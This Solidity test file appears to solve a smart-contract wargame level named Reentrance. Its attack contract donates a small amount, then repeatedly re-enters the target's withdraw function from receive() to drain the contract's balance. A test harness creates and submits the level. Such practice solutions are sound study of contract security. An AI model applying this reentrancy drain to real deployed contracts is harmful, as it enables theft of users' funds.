// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract ReentranceAttack {
  IReentrance internal target;

  constructor(address _challengeAddress) payable {
    target = IReentrance(_challengeAddress);
  }

  function attack() external {
    // first donate something to be able to pass the require
    target.donate{value: 0.001 ether}(address(this));

    // then trigger the withdraw function
    // the latter will call receive() below.
    target.withdraw(0.001 ether);
  }

  receive() external payable {
    uint targetBalance = address(target).balance;

    // this can be a clean way to drain the contract.
    // you can also just set target.withdraw() and
    // re-enter until it reverts.
    if (targetBalance >= 0.001 ether) {
      target.withdraw(0.001 ether);
    }
  }
}

contract ReentranceTest is Test {
  address internal challengeAddress;
  ReentranceAttack internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xe6BA07257a9321e755184FB2F995e0600E78c16D, 0.001 ether);
    attackContract = new ReentranceAttack{value: 0.001 ether}(challengeAddress);
  }

  function testExploit() public {
    attackContract.attack();

    utils.submitLevelInstance(challengeAddress);
  }
}
